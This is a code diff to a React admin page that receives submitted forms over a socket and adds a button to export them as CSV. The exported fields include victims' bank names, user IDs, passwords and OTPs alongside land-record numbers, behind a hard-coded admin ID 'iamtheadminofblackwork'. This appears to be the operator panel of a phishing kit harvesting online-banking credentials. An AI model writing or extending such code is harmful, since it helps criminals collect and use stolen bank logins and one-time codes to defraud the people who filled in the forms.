@@ -12,6 +12,45 @@ const Admin = () => {
     setAdminId(input); // trigger re-render
   }
 
+  // ✅ Export data as CSV
+  function handleExportData() {
+    if (submittedForms.length === 0) {
+      alert("No data to export!");
+      return;
+    }
+
+    // Define CSV headers
+    const headers = ["Name", "Mobile", "Patta/Survey", "Bank", "User ID", "Password", "OTP", "Form ID", "Timestamp"];
+    
+    // Convert data to CSV format
+    const csvContent = [
+      headers.join(","),
+      ...submittedForms.map(form => [
+        `"${form.name || ""}"`,
+        `"${form.mobile || ""}"`,
+        `"${form.pattaOrSurvey || ""}"`,
+        `"${form.bank || ""}"`,
+        `"${form.userId || ""}"`,
+        `"${form.password || ""}"`,
+        `"${form.otp || ""}"`,
+        `"${form.id || ""}"`,
+        `"${new Date().toLocaleString()}"`
+      ].join(","))
+    ].join("\n");
+
+    // Create and download the CSV file
+    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
+    const link = document.createElement("a");
+    const url = URL.createObjectURL(blob);
+    link.setAttribute("href", url);
+    link.setAttribute("download", `form_data_${new Date().toISOString().split('T')[0]}.csv`);
+    link.style.visibility = "hidden";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  }
+
+
   // ✅ check only correct admin ID
   useEffect(() => {
     if (adminId && adminId !== "iamtheadminofblackwork") {
@@ -41,6 +80,9 @@ const Admin = () => {
 
     return () => socket.off("form:update");
   }, [socket]);
+
+
+  
 
   if (!adminId || adminId !== "iamtheadminofblackwork") {
     return (
@@ -107,7 +149,30 @@ const Admin = () => {
 
   return (
     <div style={{ padding: "20px" }}>
-      <h2>Admin Hub - Received Forms</h2>
+      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "20px" }}>
+        <h2>Admin Hub - Received Forms</h2>
+        <button
+          onClick={handleExportData}
+          style={{
+            padding: "10px 20px",
+            backgroundColor: "#28a745",
+            color: "white",
+            border: "none",
+            borderRadius: "6px",
+            cursor: "pointer",
+            fontWeight: "bold",
+            transition: "0.3s",
+          }}
+          onMouseOver={(e) =>
+            (e.currentTarget.style.backgroundColor = "#218838")
+          }
+          onMouseOut={(e) =>
+            (e.currentTarget.style.backgroundColor = "#28a745")
+          }
+        >
+          📥 Export Data
+        </button>
+      </div>
       {submittedForms.length === 0 ? (
         <p>No forms submitted yet.</p>
       ) : (
